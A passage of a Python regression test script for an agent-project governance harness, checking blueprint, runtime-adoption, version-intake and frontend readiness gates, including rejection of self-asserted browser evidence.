    blueprint = json.loads(blueprint_path.read_text(encoding="utf-8"))
    blueprint["status"] = "reviewed"
    blueprint["status_reason"] = "Regression fixture confirms project blueprint before implementation."
    for record in blueprint.get("records", []):
        if isinstance(record, dict):
            record["status"] = "reviewed"
            record["review_evidence"] = "npm regression readiness fixture"
    blueprint_path.write_text(json.dumps(blueprint, indent=2) + "\n", encoding="utf-8")


def assert_readiness_passes(target: Path, python: str) -> None:
    run([python, "scripts/agent_blueprint.py", "readiness"], cwd=target)
    run([python, "scripts/agent_runtime.py", "readiness"], cwd=target)
    run([python, "scripts/agent_check.py", "--strict"], cwd=target)
    run([python, "scripts/agent_validate.py", "readiness", "--require-configured"], cwd=target)
    run(["node", str(NPM_BIN), "readiness", str(target)], cwd=PACKAGE_ROOT)


def assert_agent_development_readiness(temp_root: Path, python: str) -> None:
    blank = temp_root / "readiness-blank-default"
    blank.mkdir(parents=True, exist_ok=True)
    run(["node", str(NPM_BIN), "init", str(blank), "--tech-stack", "python", "--layout", "minimal", "--remote-kind", "local"], cwd=PACKAGE_ROOT)
    harness = json.loads((blank / ".agent" / "harness.json").read_text(encoding="utf-8"))
    readiness = harness.get("validation", {}).get("readiness", [])
    for command in (
        "python3 scripts/agent_blueprint.py readiness",
        "python3 scripts/agent_runtime.py readiness",
        "python3 scripts/agent_check.py --strict",
    ):
        if command not in readiness:
            print(f"readiness suite missing command: {command}", file=sys.stderr)
            print(json.dumps(readiness, indent=2), file=sys.stderr)
            raise SystemExit(1)
    run([python, "scripts/agent_check.py"], cwd=blank)
    run([python, "scripts/agent_blueprint.py", "doctor"], cwd=blank)
    run([python, "scripts/agent_runtime.py", "doctor"], cwd=blank)
    strict_blank = run([python, "scripts/agent_check.py", "--strict"], cwd=blank, expect_ok=False)
    strict_output = strict_blank.stdout + strict_blank.stderr
    if (
        "blueprint status must be reviewed" not in strict_output
        or "selection_status must be confirmed" not in strict_output
    ):
        print("strict readiness did not fail on draft blueprint and unconfirmed runtime", file=sys.stderr)
        print(strict_output, file=sys.stderr)
        raise SystemExit(1)
    run([python, "scripts/agent_validate.py", "readiness", "--require-configured"], cwd=blank, expect_ok=False)
    npm_blank = run(["node", str(NPM_BIN), "readiness", str(blank)], cwd=PACKAGE_ROOT, expect_ok=False)
    if "generated-project implementation readiness" not in (npm_blank.stdout + npm_blank.stderr):
        print("npm readiness output did not describe project readiness", file=sys.stderr)
        print(npm_blank.stdout + npm_blank.stderr, file=sys.stderr)
        raise SystemExit(1)
    doctor_output = run(["node", str(NPM_BIN), "doctor", str(blank)], cwd=PACKAGE_ROOT).stdout
    if "not target project implementation readiness" not in doctor_output:
        print("npm doctor output did not distinguish install health from readiness", file=sys.stderr)
        print(doctor_output, file=sys.stderr)
        raise SystemExit(1)

    matrix = [
        (
            "confirmed-agent",
            {
                "project_target": "agent",
                "selection_status": "confirmed",
                "language_preference": ["python"],
            },
        ),
        (
            "confirmed-hybrid",
            {
                "project_target": "hybrid",
                "selection_status": "confirmed",
                "language_preference": ["python"],
            },
        ),
        (
            "confirmed-mcp",
            {
                "project_target": "mcp-server",
                "selection_status": "confirmed",
            },
        ),
        (
            "confirmed-library",
            {
                "project_target": "library",
                "selection_status": "confirmed",
            },
        ),
        (
            "manual-llm-exception",
            {
                "project_target": "agent",
                "default_runtime_adapter": "custom",
                "selection_status": "confirmed",
                "language_preference": ["python"],
                "manual_llm_exception": {
                    "status": "accepted",
                    "rationale": "Regression fixture requires custom orchestration.",
                    "owner": "architecture-review",
                    "review_evidence": "docs/features/runtime/05_CODE_REVIEW.md",
                    "validation_evidence": "python3 scripts/agent_runtime.py readiness",
                    "residual_risk": "Custom orchestration needs project-owned regression coverage.",
                },
            },
        ),
    ]
    for case_id, intake in matrix:
        intake_path = temp_root / f"readiness-{case_id}-intake.json"
        write_intake(intake_path, intake)
        target = temp_root / f"readiness-{case_id}"
        target.mkdir(parents=True, exist_ok=True)
        run(
            [
                python,
                str(INIT_SCRIPT),
                str(target),
                "--tech-stack",
                "python",
                "--layout",
                "minimal",
                "--remote-kind",
                "local",
                "--governance-profile",
                "standard",
                "--architecture-intake",
                str(intake_path),
            ],
            cwd=PACKAGE_ROOT,
        )
        mark_blueprint_reviewed(target, with_versions=False)
        version_missing = run([python, "scripts/agent_blueprint.py", "readiness"], cwd=target, expect_ok=False)
        if "technology version" not in (version_missing.stdout + version_missing.stderr) and "runtime package plan missing version constraint" not in (version_missing.stdout + version_missing.stderr):
            print("blueprint readiness did not fail when version constraints were missing", file=sys.stderr)
            print(version_missing.stdout + version_missing.stderr, file=sys.stderr)
            raise SystemExit(1)
        add_version_decisions(target)
        assert_readiness_passes(target, python)


def assert_nested_technology_version_intake(temp_root: Path, python: str) -> None:
    intake_path = temp_root / "nested-technology-version-intake.json"
    write_intake(
        intake_path,
        {
            "project_target": "agent",
            "selection_status": "confirmed",
            "language_preference": ["python", "node"],
            "default_runtime_adapter": "strands",
            "optional_runtime_adapters": ["pydantic-ai", "mcp-server"],
            "technology_versions": {
                "version_policy": "Record LTS lines, semver ranges, and accepted application lockfile policies.",
                "dependency_version_policy": "defer-to-lockfile",
                "version_constraints": {
                    "python": ">=3.12,<3.13",
                    "node": ">=22,<23",
                    "strands-agents": ">=0.1,<1",
                    "pydantic-ai": ">=0.4,<1",
                    "mcp": ">=1,<2",
                },
                "languages_and_runtimes": [
                    {"name": "python", "constraint": ">=3.12,<3.13", "source": ".python-version", "status": "decided"},
                    {"name": "node", "constraint": ">=22,<23", "source": ".nvmrc", "status": "decided"},
                ],
                "package_managers": [
                    {"name": "uv", "constraint": ">=0.7,<1", "source": "pyproject.toml", "status": "decided"},
                    {"name": "npm", "constraint": ">=10,<11", "source": "package-lock.json", "status": "decided"},
                ],
                "frameworks_and_libraries": [
                    {"name": "fastapi", "constraint": ">=0.115,<1", "source": "pyproject.toml", "status": "decided"}
                ],
                "datastores_and_services": [
                    {"name": "postgres", "constraint": "16.x managed service", "source": "deployment config", "status": "decided"}
                ],
                "deployment_targets": [
                    {"name": "docker", "constraint": "compose spec v2", "source": "compose.yaml", "status": "decided"}
                ],
                "agent_runtime_and_mcp": [
                    {"name": "strands", "constraint": "defer-to-application-lockfile", "source": "runtime plan", "status": "deferred-to-application-lockfile"},
                    {"name": "mcp-sdk", "constraint": ">=1,<2", "source": "runtime plan", "status": "decided"},
                ],
                "lockfile_or_environment_evidence": [
                    {"name": "package-lock.json", "constraint": "application-owned lockfile", "source": "repository", "status": "decided"}
                ],
                "open_version_decisions": [],
            },
        },
    )
    target = temp_root / "nested-technology-version-intake"
    target.mkdir(parents=True, exist_ok=True)
    run(
        [
            python,
            str(INIT_SCRIPT),
            str(target),
            "--tech-stack",
            "python,node",
            "--layout",
            "minimal",
            "--remote-kind",
            "local",
            "--governance-profile",
            "standard",
            "--architecture-intake",
            str(intake_path),
        ],
        cwd=PACKAGE_ROOT,
    )
    blueprint = json.loads((target / ".agent" / "blueprint.json").read_text(encoding="utf-8"))
    decisions = blueprint.get("technology_version_decisions", {})
    expected = {
        "languages_and_runtimes": {"python", "node"},
        "package_managers": {"uv", "npm"},
        "frameworks_and_libraries": {"fastapi"},
        "datastores_and_services": {"postgres"},
        "deployment_targets": {"docker"},
        "agent_runtime_and_mcp": {"strands", "mcp-sdk", "pydantic-ai", "mcp-server"},
        "lockfile_or_environment_evidence": {"package-lock.json"},
    }
    for field, names in expected.items():
        actual = {str(item.get("name", "")) for item in decisions.get(field, []) if isinstance(item, dict)}
        missing = names - actual
        if missing:
            print(f"nested technology_versions did not populate {field}: {sorted(missing)}", file=sys.stderr)
            print(json.dumps(decisions, indent=2), file=sys.stderr)
            raise SystemExit(1)
    runtime = blueprint.get("runtime_framework_decision", {})
    for plan in runtime.get("package_plan", []):
        constraints = plan.get("package_version_constraints", {})
        if plan.get("version_status") == "unresolved" or not (constraints or plan.get("version_policy") in {"defer-to-lockfile", "application-lockfile", "managed-by-application"}):
            print("nested technology_versions did not resolve package plan version policy", file=sys.stderr)
            print(json.dumps(runtime.get("package_plan", []), indent=2), file=sys.stderr)
            raise SystemExit(1)
    mark_blueprint_reviewed(target, with_versions=False)
    assert_readiness_passes(target, python)


def assert_runtime_adoption_defaults(temp_root: Path, python: str) -> None:
    default_agent = temp_root / "runtime-adoption-default"
    default_agent.mkdir(parents=True, exist_ok=True)
    run(
        [
            python,
            str(INIT_SCRIPT),
            str(default_agent),
            "--tech-stack",
            "python",
            "--layout",
            "minimal",
            "--remote-kind",
            "local",
            "--governance-profile",
            "standard",
        ],
        cwd=PACKAGE_ROOT,
    )
    runtime = json.loads((default_agent / ".agent" / "agent-runtime.json").read_text(encoding="utf-8"))
    adoption = runtime.get("runtime_adoption", {})
    if adoption.get("status") != "planned":
        print("default agent runtime adoption was not planned", file=sys.stderr)
        print(json.dumps(adoption, indent=2), file=sys.stderr)
        raise SystemExit(1)
    if adoption.get("policy", {}).get("default_posture") != "framework-first":
        print("default agent runtime adoption was not framework-first", file=sys.stderr)
        raise SystemExit(1)
    plan_adapters = {item.get("adapter") for item in adoption.get("package_plan", [])}
    if "strands" not in plan_adapters or "pydantic-ai" not in plan_adapters:
        print("default agent runtime adoption did not include Strands and Pydantic AI package plans", file=sys.stderr)
        print(json.dumps(adoption.get("package_plan", []), indent=2), file=sys.stderr)
        raise SystemExit(1)
    commands = [
        command.get("command", "")
        for item in adoption.get("package_plan", [])
        for command in item.get("commands", [])
    ]
    if not any("strands-agents" in command for command in commands):
        print("default runtime adoption plan did not include strands-agents install command", file=sys.stderr)
        raise SystemExit(1)
    if not any("pydantic-ai" in command for command in commands):
        print("default runtime adoption plan did not include pydantic-ai install command", file=sys.stderr)
        raise SystemExit(1)
    report = json.loads(run([python, "scripts/agent_runtime.py", "report", "--json"], cwd=default_agent).stdout)
    if report.get("runtime_adoption", {}).get("primary_adapter") != "strands":
        print("agent_runtime report did not expose Strands as primary adapter", file=sys.stderr)
        print(json.dumps(report, indent=2), file=sys.stderr)
        raise SystemExit(1)
    run([python, "scripts/agent_runtime.py", "doctor"], cwd=default_agent)

    custom_intake = temp_root / "custom-runtime-intake.json"
    custom_intake.write_text(
        json.dumps(
            {
                "schema": "agent-architecture-intake-v1",
                "project_target": "agent",
                "default_runtime_adapter": "custom",
                "selection_status": "confirmed",
                "language_preference": ["python"],
            },
            indent=2,
        )
        + "\n",
        encoding="utf-8",
    )
    custom_agent = temp_root / "runtime-adoption-custom-missing-exception"
    custom_agent.mkdir(parents=True, exist_ok=True)
    run(
        [
            python,
            str(INIT_SCRIPT),
            str(custom_agent),
            "--tech-stack",
            "python",
            "--layout",
            "minimal",
            "--remote-kind",
            "local",
            "--governance-profile",
            "standard",
            "--architecture-intake",
            str(custom_intake),
        ],
        cwd=PACKAGE_ROOT,
    )
    custom_doctor = run([python, "scripts/agent_runtime.py", "doctor"], cwd=custom_agent, expect_ok=False)
    if "manual_llm_exception" not in (custom_doctor.stdout + custom_doctor.stderr):
        print("custom runtime without exception did not fail on manual_llm_exception", file=sys.stderr)
        print(custom_doctor.stdout + custom_doctor.stderr, file=sys.stderr)
        raise SystemExit(1)

    accepted_intake = temp_root / "custom-runtime-accepted-intake.json"
    accepted_intake.write_text(
        json.dumps(
            {
                "schema": "agent-architecture-intake-v1",
                "project_target": "agent",
                "default_runtime_adapter": "custom",
                "selection_status": "confirmed",
                "language_preference": ["python"],
                "manual_llm_exception": {
                    "status": "accepted",
                    "rationale": "Project constraint requires a custom adapter boundary.",
                    "owner": "architecture-review",
                    "review_evidence": "docs/features/runtime/05_CODE_REVIEW.md",
                    "validation_evidence": "python3 scripts/agent_runtime.py doctor",
                    "residual_risk": "Custom adapter requires project-owned regression coverage.",
                },
            },
            indent=2,
        )
        + "\n",
        encoding="utf-8",
    )
    accepted_agent = temp_root / "runtime-adoption-custom-accepted"
    accepted_agent.mkdir(parents=True, exist_ok=True)
    run(
        [
            python,
            str(INIT_SCRIPT),
            str(accepted_agent),
            "--tech-stack",
            "python",
            "--layout",
            "minimal",
            "--remote-kind",
            "local",
            "--governance-profile",
            "standard",
            "--architecture-intake",
            str(accepted_intake),
        ],
        cwd=PACKAGE_ROOT,
    )
    run([python, "scripts/agent_runtime.py", "doctor"], cwd=accepted_agent)


def assert_project_blueprint_governance(temp_root: Path, python: str) -> None:
    standard = temp_root / "project-blueprint-standard"
    standard.mkdir(parents=True, exist_ok=True)
    run(
        [
            python,
            str(INIT_SCRIPT),
            str(standard),
            "--tech-stack",
            "python",
            "--layout",
            "minimal",
            "--remote-kind",
            "local",
            "--governance-profile",
            "standard",
        ],
        cwd=PACKAGE_ROOT,
    )
    for relative in (
        ".agent/blueprint.json",
        "docs/PROJECT_BLUEPRINT.md",
        ".agent/templates/project-blueprint.md.tmpl",
        "scripts/agent_blueprint.py",
    ):
        if not (standard / relative).exists():
            print(f"standard profile did not create blueprint artifact: {relative}", file=sys.stderr)
            raise SystemExit(1)
    run([python, "scripts/agent_blueprint.py", "doctor"], cwd=standard)
    report = json.loads(run([python, "scripts/agent_blueprint.py", "report", "--json"], cwd=standard).stdout)
    if report.get("runtime_framework_decision", {}).get("runtime_adoption") != "framework-first":
        print("standard blueprint did not default agent target to framework-first", file=sys.stderr)
        print(json.dumps(report, indent=2), file=sys.stderr)
        raise SystemExit(1)
    runtime_report = json.loads(run([python, "scripts/agent_runtime.py", "report", "--json"], cwd=standard).stdout)
    if runtime_report.get("blueprint", {}).get("runtime_adoption") != "framework-first":
        print("agent_runtime report did not include blueprint runtime decision", file=sys.stderr)
        print(json.dumps(runtime_report, indent=2), file=sys.stderr)
        raise SystemExit(1)

    run(
        [
            python,
            "scripts/agent_spec.py",
            "new-change",
            "blueprint-impact-smoke",
            "--summary",
            "Change runtime architecture smoke.",
            "--profile",
            "tiny",
        ],
        cwd=standard,
    )
    change = standard / "openspec" / "changes" / "blueprint-impact-smoke"
    metadata_path = change / ".agent-spec.json"
    metadata = json.loads(metadata_path.read_text(encoding="utf-8"))
    if "blueprint_impact" not in metadata:
        print("new-change did not scaffold blueprint_impact metadata", file=sys.stderr)
        print(json.dumps(metadata, indent=2), file=sys.stderr)
        raise SystemExit(1)
    proposal_text = (change / "proposal.md").read_text(encoding="utf-8")
    if "## Blueprint Impact" not in proposal_text:
        print("new-change did not scaffold proposal Blueprint Impact section", file=sys.stderr)
        raise SystemExit(1)
    no_reason = run([python, "scripts/agent_spec.py", "doctor"], cwd=standard, expect_ok=False)
    if "no_impact_reason" not in (no_reason.stdout + no_reason.stderr):
        print("agent_spec doctor did not require no-impact reason for architecture-looking change", file=sys.stderr)
        print(no_reason.stdout + no_reason.stderr, file=sys.stderr)
        raise SystemExit(1)
    metadata["blueprint_impact"]["impact_type"] = "modify"
    metadata["blueprint_impact"]["affected_blueprint_ids"] = ["BP-UNKNOWN"]
    metadata_path.write_text(json.dumps(metadata, indent=2) + "\n", encoding="utf-8")
    unknown = run([python, "scripts/agent_spec.py", "doctor"], cwd=standard, expect_ok=False)
    if "unknown affected_blueprint_ids" not in (unknown.stdout + unknown.stderr):
        print("agent_spec doctor did not reject unknown blueprint ids", file=sys.stderr)
        print(unknown.stdout + unknown.stderr, file=sys.stderr)
        raise SystemExit(1)
    metadata["blueprint_impact"]["affected_blueprint_ids"] = ["BP-RUNTIME-001"]
    metadata["blueprint_impact"]["blueprint_update_required"] = True
    metadata_path.write_text(json.dumps(metadata, indent=2) + "\n", encoding="utf-8")
    (change / "proposal.md").write_text(
        """# Proposal: blueprint-impact-smoke

## Summary

Change runtime architecture smoke.

## Blueprint Impact

```yaml
affected_blueprint_ids:
  - BP-RUNTIME-001
impact_type: modify
runtime_framework_impact: none
blueprint_update_required: true
adr_required: false
no_impact_reason: ""
```

## Goals

- Verify blueprint archive gate.
""",
        encoding="utf-8",
    )
    (change / "design.md").write_text("# Design: blueprint-impact-smoke\n\n## Architecture\n\nUse blueprint gate.\n", encoding="utf-8")
    (change / "tasks.md").write_text("# Tasks: blueprint-impact-smoke\n\n## Validation\n\n- [x] Verify blueprint gate.\n", encoding="utf-8")
    archive_block = run([python, "scripts/agent_spec.py", "archive", "blueprint-impact-smoke"], cwd=standard, expect_ok=False)
    if "blueprint update evidence" not in (archive_block.stdout + archive_block.stderr):
        print("archive did not block missing blueprint update evidence", file=sys.stderr)
        print(archive_block.stdout + archive_block.stderr, file=sys.stderr)
        raise SystemExit(1)
    metadata = json.loads(metadata_path.read_text(encoding="utf-8"))
    metadata["blueprint_impact"]["blueprint_update_evidence"] = "docs/PROJECT_BLUEPRINT.md reviewed for regression fixture"
    metadata_path.write_text(json.dumps(metadata, indent=2) + "\n", encoding="utf-8")
    run([python, "scripts/agent_spec.py", "archive", "blueprint-impact-smoke"], cwd=standard)

    core = temp_root / "project-blueprint-core"
    core.mkdir(parents=True, exist_ok=True)
    run(
        [
            python,
            str(INIT_SCRIPT),
            str(core),
            "--layout",
            "minimal",
            "--remote-kind",
            "local",
            "--governance-profile",
            "core",
        ],
        cwd=PACKAGE_ROOT,
    )
    for relative in (".agent/blueprint.json", "docs/PROJECT_BLUEPRINT.md", "scripts/agent_blueprint.py"):
        if (core / relative).exists():
            print(f"core profile unexpectedly generated blueprint artifact: {relative}", file=sys.stderr)
            raise SystemExit(1)

    mcp_intake = temp_root / "project-blueprint-mcp-intake.json"
    mcp_intake.write_text(json.dumps({"project_target": "mcp-server", "selection_status": "confirmed"}, indent=2) + "\n", encoding="utf-8")
    mcp = temp_root / "project-blueprint-mcp"
    mcp.mkdir(parents=True, exist_ok=True)
    run([python, str(INIT_SCRIPT), str(mcp), "--layout", "minimal", "--governance-profile", "standard", "--architecture-intake", str(mcp_intake)], cwd=PACKAGE_ROOT)
    mcp_blueprint = json.loads((mcp / ".agent" / "blueprint.json").read_text(encoding="utf-8"))
    if mcp_blueprint.get("runtime_framework_decision", {}).get("runtime_adoption") != "mcp-first":
        print("mcp-server blueprint did not use mcp-first runtime adoption", file=sys.stderr)
        print(json.dumps(mcp_blueprint, indent=2), file=sys.stderr)
        raise SystemExit(1)
    run([python, "scripts/agent_blueprint.py", "doctor"], cwd=mcp)

    library_intake = temp_root / "project-blueprint-library-intake.json"
    library_intake.write_text(json.dumps({"project_target": "library", "selection_status": "confirmed"}, indent=2) + "\n", encoding="utf-8")
    library = temp_root / "project-blueprint-library"
    library.mkdir(parents=True, exist_ok=True)
    run([python, str(INIT_SCRIPT), str(library), "--layout", "minimal", "--governance-profile", "standard", "--architecture-intake", str(library_intake)], cwd=PACKAGE_ROOT)
    library_blueprint = json.loads((library / ".agent" / "blueprint.json").read_text(encoding="utf-8"))
    if library_blueprint.get("runtime_framework_decision", {}).get("runtime_adoption") != "library-only":
        print("library blueprint did not use library-only runtime adoption", file=sys.stderr)
        print(json.dumps(library_blueprint, indent=2), file=sys.stderr)
        raise SystemExit(1)
    run([python, "scripts/agent_blueprint.py", "doctor"], cwd=library)


def assert_frontend_web_governance(temp_root: Path, python: str) -> None:
    install_markers = ("node_modules", ".pnpm-store", ".yarn", "bun.lock", "bun.lockb")

    def assert_doctor_finding(target: Path, expected: str) -> None:
        result = subprocess.run(
            [python, "scripts/agent_frontend.py", "doctor"],
            cwd=target,
            text=True,
            capture_output=True,
            check=False,
        )
        output = result.stdout + result.stderr
        if result.returncode == 0 or "Traceback" in output or expected not in output:
            print(f"frontend doctor did not report deterministic finding: {expected}", file=sys.stderr)
            print(output, file=sys.stderr)
            raise SystemExit(1)

    def assert_malformed_json_finding(
        target: Path,
        relative: str,
        mutate: object,
        expected: str,
    ) -> None:
        path = target / relative
        original = path.read_text(encoding="utf-8")
        data = json.loads(original)
        mutate(data)
        path.write_text(json.dumps(data, indent=2) + "\n", encoding="utf-8")
        try:
            assert_doctor_finding(target, expected)
        finally:
            path.write_text(original, encoding="utf-8")

    non_web = temp_root / "frontend-non-web"
    non_web.mkdir(parents=True, exist_ok=True)
    run(
        [
            python,
            str(INIT_SCRIPT),
            str(non_web),
            "--tech-stack",
            "python",
            "--layout",
            "service",
            "--governance-profile",
            "standard",
            "--no-makefile",
        ],
        cwd=PACKAGE_ROOT,
    )
    for relative in (".agent/frontend.json", "scripts/agent_frontend.py", "docs/FRONTEND_GOVERNANCE.md"):
        if (non_web / relative).exists():
            print(f"non-Web project unexpectedly generated frontend artifact: {relative}", file=sys.stderr)
            raise SystemExit(1)
    for relative in ("docs/PROJECT_BLUEPRINT.md", ".agent/templates/project-blueprint.md.tmpl"):
        if "Frontend Web Stack Decision" in (non_web / relative).read_text(encoding="utf-8"):
            print(f"non-Web project unexpectedly gained a frontend Blueprint section: {relative}", file=sys.stderr)
            raise SystemExit(1)
    run([python, "scripts/agent_check.py"], cwd=non_web)

    web = temp_root / "frontend-web-default"
    web.mkdir(parents=True, exist_ok=True)
    run(
        [
            python,
            str(INIT_SCRIPT),
            str(web),
            "--tech-stack",
            "typescript",
            "--layout",
            "web-app",
            "--governance-profile",
            "standard",
            "--no-makefile",
        ],
        cwd=PACKAGE_ROOT,
    )
    frontend_path = web / ".agent" / "frontend.json"
    frontend = json.loads(frontend_path.read_text(encoding="utf-8"))
    stack = frontend.get("stack_decision", {})
    expected_stack = {
        "profile": "react-vite-client",
        "framework": "react",
        "build_tool": "vite",
        "router": "react-router",
        "selection_status": "recommended",
    }
    for key, expected in expected_stack.items():
        if stack.get(key) != expected:
            print(f"greenfield Web stack {key} mismatch: expected {expected}, got {stack.get(key)}", file=sys.stderr)
            raise SystemExit(1)
    if stack.get("typescript", {}).get("strict") is not True:
        print("greenfield Web stack did not require strict TypeScript", file=sys.stderr)
        raise SystemExit(1)
    if frontend.get("visualization", {}).get("engine") != "none" or "echarts" in frontend.get("visualization", {}):
        print("greenfield Web stack enabled ECharts without visualization intake", file=sys.stderr)
        raise SystemExit(1)
    for marker in install_markers:
        if (web / marker).exists():
            print(f"frontend initialization unexpectedly created dependency artifact: {marker}", file=sys.stderr)
            raise SystemExit(1)
    run([python, "scripts/agent_frontend.py", "doctor"], cwd=web)
    run([python, "scripts/agent_check.py"], cwd=web)
    run([python, "scripts/agent_verify.py", "doctor"], cwd=web)
    run([python, "scripts/agent_migrate.py", "doctor"], cwd=web)
    malformed_cases = (
        (".agent/frontend.json", lambda data: data["stack_decision"].__setitem__("typescript", []), "stack_decision.typescript must be an object"),
        (".agent/frontend.json", lambda data: data.__setitem__("harness", []), "harness must be an object"),
        (".agent/frontend.json", lambda data: data["harness"].__setitem__("lanes", []), "harness.lanes must be an object"),
        (".agent/frontend.json", lambda data: data["browser_evidence"].__setitem__("viewports", {}), "browser_evidence.viewports must be a list"),
        (".agent/frontend.json", lambda data: data["browser_evidence"].__setitem__("freshness_days", {}), "browser_evidence.freshness_days must be a positive integer"),
        (".agent/frontend.json", lambda data: data["accessibility"].__setitem__("manual_coverage", {}), "accessibility.manual_coverage must be a list"),
        (".agent/frontend.json", lambda data: data.__setitem__("ui_states", {}), "ui_states must be a list"),
        (".agent/blueprint.json", lambda data: data.__setitem__("frontend_stack_decision", []), "missing BP-FRONTEND-001"),
        (".agent/harness.json", lambda data: data.__setitem__("validation", []), "validation must be an object"),
        (".agent/harness.json", lambda data: data.__setitem__("frontend", []), "frontend must be an object"),
    )
    for relative, mutate, expected in malformed_cases:
        assert_malformed_json_finding(web, relative, mutate, expected)
    readiness = run([python, "scripts/agent_frontend.py", "readiness"], cwd=web, expect_ok=False)
    if "browser evidence missing" not in (readiness.stdout + readiness.stderr):
        print("frontend readiness did not reject missing browser-rendered evidence", file=sys.stderr)
        raise SystemExit(1)
    strict = run([python, "scripts/agent_check.py", "--strict"], cwd=web, expect_ok=False)
    if "frontend readiness failed" not in (strict.stdout + strict.stderr):
        print("strict agent check did not propagate frontend readiness failure", file=sys.stderr)
        raise SystemExit(1)
    score = run([python, "scripts/agent_score.py", "score", "--json"], cwd=web, expect_ok=False)
    score_report = json.loads(score.stdout)
    if "frontend_governance" not in score_report.get("hard_fail_dimensions", []):
        print("governance score did not hard-fail missing frontend readiness evidence", file=sys.stderr)
        raise SystemExit(1)

    default_vitals = frontend.get("performance", {}).get("core_web_vitals", {})
    if default_vitals.get("threshold_policy") != "default-good-p75":
        print("default Web Vitals policy was not recorded", file=sys.stderr)
        print(json.dumps(default_vitals, indent=2), file=sys.stderr)
        raise SystemExit(1)

    rejected_vitals_intake = temp_root / "frontend-vitals-rejected.json"
    rejected_vitals_intake.write_text(
        json.dumps({"frontend": {"enabled": True, "core_web_vitals": {"lcp_ms": 3000}}}) + "\n",
        encoding="utf-8",
    )
    rejected_vitals = temp_root / "frontend-vitals-rejected"
    rejected_vitals.mkdir(parents=True, exist_ok=True)
    run([python, str(INIT_SCRIPT), str(rejected_vitals), "--layout", "web-app", "--governance-profile", "standard", "--architecture-intake", str(rejected_vitals_intake), "--no-makefile"], cwd=PACKAGE_ROOT)
    assert_doctor_finding(rejected_vitals, "alternative_policy missing rationale")

    accepted_vitals_intake = temp_root / "frontend-vitals-accepted.json"
    accepted_vitals_intake.write_text(
        json.dumps(
            {
                "frontend": {
                    "enabled": True,
                    "core_web_vitals": {
                        "percentile": 90,
                        "lcp_ms": 3000,
                        "inp_ms": 250,
                        "cls": 0.15,
                        "alternative_policy": {
                            "rationale": "Authenticated analytics workspace prioritizes complete data hydration.",
                            "owner": "frontend-architecture",
                            "review_evidence": "docs/features/frontend-performance/05_CODE_REVIEW.md",
                        },
                    },
                }
            }
        )
        + "\n",
        encoding="utf-8",
    )
    accepted_vitals = temp_root / "frontend-vitals-accepted"
    accepted_vitals.mkdir(parents=True, exist_ok=True)
    run([python, str(INIT_SCRIPT), str(accepted_vitals), "--layout", "web-app", "--governance-profile", "standard", "--architecture-intake", str(accepted_vitals_intake), "--no-makefile"], cwd=PACKAGE_ROOT)
    accepted_policy = json.loads((accepted_vitals / ".agent" / "frontend.json").read_text(encoding="utf-8"))["performance"]["core_web_vitals"]
    if accepted_policy.get("threshold_policy") != "reviewed-alternative" or accepted_policy.get("alternative_policy", {}).get("owner") != "frontend-architecture":
        print("reviewed alternative Web Vitals policy was not preserved", file=sys.stderr)
        print(json.dumps(accepted_policy, indent=2), file=sys.stderr)
        raise SystemExit(1)
    missing_vitals_evidence = run([python, "scripts/agent_frontend.py", "doctor"], cwd=accepted_vitals, expect_ok=False)
    if "review_evidence does not exist" not in (missing_vitals_evidence.stdout + missing_vitals_evidence.stderr):
        print("frontend doctor accepted a missing alternative Web Vitals review evidence path", file=sys.stderr)
        raise SystemExit(1)
    accepted_review_path = accepted_vitals / accepted_policy["alternative_policy"]["review_evidence"]
    accepted_review_path.parent.mkdir(parents=True, exist_ok=True)
    accepted_review_path.write_text("# Reviewed alternative Web Vitals policy\n", encoding="utf-8")
    run([python, "scripts/agent_frontend.py", "doctor"], cwd=accepted_vitals)

    lanes = frontend["harness"]["lanes"]
    evidence_root = web / ".agent" / "local" / "frontend-evidence"
    evidence_root.mkdir(parents=True, exist_ok=True)
    fixture_script = web / "scripts" / "frontend_evidence_fixture.py"
    fixture_script.write_text(
        "from __future__ import annotations\n"
        "import json\n"
        "import os\n"
        "from datetime import datetime, timezone\n"
        "from pathlib import Path\n"
        "\n"
        "path = os.environ.get('AGENT_FRONTEND_EVIDENCE_PATH')\n"
        "if path:\n"
        "    payload = {\n"
        "        'schema': 'agent-frontend-browser-evidence-v1',\n"
        "        'kind': 'browser-rendered',\n"
        "        'status': 'pass',\n"
        "        'run_id': os.environ['AGENT_FRONTEND_RUN_ID'],\n"
        "        'captured_at': datetime.now(timezone.utc).isoformat(timespec='microseconds').replace('+00:00', 'Z'),\n"
        "        'rendered': True,\n"
        "        'interaction_checks_passed': True,\n"
        "        'responsive_checks_passed': True,\n"
        "        'accessibility_checks_passed': True,\n"
        "        'viewports': json.loads(os.environ['AGENT_FRONTEND_VIEWPORTS_JSON']),\n"
        "        'browser_families': json.loads(os.environ['AGENT_FRONTEND_BROWSER_FAMILIES_JSON']),\n"
        "        'runtime': {'console_errors': 0, 'unhandled_rejections': 0, 'failed_requests': 0},\n"
        "    }\n"
        "    target = Path(path)\n"
        "    target.parent.mkdir(parents=True, exist_ok=True)\n"
        "    target.write_text(json.dumps(payload, indent=2) + '\\n', encoding='utf-8')\n",
        encoding="utf-8",
    )
    fixture_command = f'"{python}" scripts/frontend_evidence_fixture.py'
    for lane_name, lane in lanes.items():
        if lane.get("required") is True:
            lane["command"] = fixture_command
            lane_path = evidence_root / f"{lane_name}.json"
            lane_path.write_text(json.dumps({"status": "pass"}) + "\n", encoding="utf-8")
            lane["evidence_path"] = lane_path.relative_to(web).as_posix()
    browser_path = evidence_root / "browser.json"
    browser_path.write_text(json.dumps({"status": "pass", "renderer": "browser"}) + "\n", encoding="utf-8")
    frontend["stack_decision"]["selection_status"] = "confirmed"
    frontend["browser_evidence"].update(
        {
            "kind": "browser-rendered",
            "status": "pass",
            "command": fixture_command,
            "evidence_path": browser_path.relative_to(web).as_posix(),
            "run_id": "frontend-regression-browser-1",
            "captured_at": datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%SZ"),
            "viewports": ["390x844", "1440x900"],
            "browser_families": ["chromium"],
        }
    )
    frontend_path.write_text(json.dumps(frontend, indent=2) + "\n", encoding="utf-8")
    blueprint_path = web / ".agent" / "blueprint.json"
    blueprint = json.loads(blueprint_path.read_text(encoding="utf-8"))
    blueprint["frontend_stack_decision"]["selection_status"] = "confirmed"
    blueprint_path.write_text(json.dumps(blueprint, indent=2) + "\n", encoding="utf-8")
    self_asserted = run([python, "scripts/agent_frontend.py", "readiness"], cwd=web, expect_ok=False)
    if "evidence schema" not in (self_asserted.stdout + self_asserted.stderr) or "runner receipt" not in (self_asserted.stdout + self_asserted.stderr):
        print("frontend readiness accepted self-asserted lane/browser evidence", file=sys.stderr)
